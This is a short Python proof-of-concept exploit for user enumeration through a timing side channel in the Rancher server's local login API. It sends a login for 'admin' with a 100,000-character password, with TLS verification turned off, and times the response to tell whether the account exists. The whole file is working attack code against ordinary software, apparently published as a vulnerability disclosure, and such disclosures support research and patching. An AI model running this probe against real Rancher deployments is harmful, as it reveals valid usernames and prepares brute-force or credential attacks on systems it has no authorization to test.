#
# PoC: User enumeration via timing side channel in Rancher server
# Discovered by: @codexlynx
# Date: 08/18
# 

import requests
import urllib3
import json
import time

user = 'admin'

urllib3.disable_warnings()
start_time = time.time()
requests.post('https://127.0.0.1/v3-public/localProviders/local?action=login',
		headers={'Content-Type': 'application/json'},
		data=json.dumps({'username': user, 'password': ('A' * 100000)}),
		verify=False)
print(time.time() - start_time)
